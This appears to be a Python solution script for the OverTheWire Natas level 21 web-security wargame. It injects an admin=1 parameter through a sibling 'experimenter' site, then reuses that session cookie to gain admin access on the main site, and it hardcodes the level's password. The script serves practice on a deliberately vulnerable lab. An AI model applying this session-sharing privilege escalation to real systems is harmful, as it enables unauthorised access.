#!/usr/bin/env python

import requests
import re

username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

url = f'http://{username}.natas.labs.overthewire.org/'
experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'

session = requests.Session()
# response = session.get(url, auth=(username, password))
# response = session.get(experimenter,
#                        auth=(username, password))
response = session.post(experimenter, data = {'submit': '1', 'admin': '1'}, auth=(username, password))
old_session = session.cookies['PHPSESSID']

response = session.get(url, cookies = {"PHPSESSID": old_session}, auth=(username, password))
content = response.text
print(content)
print('='*80)

output = open('output.html', 'w')
output.write(content)

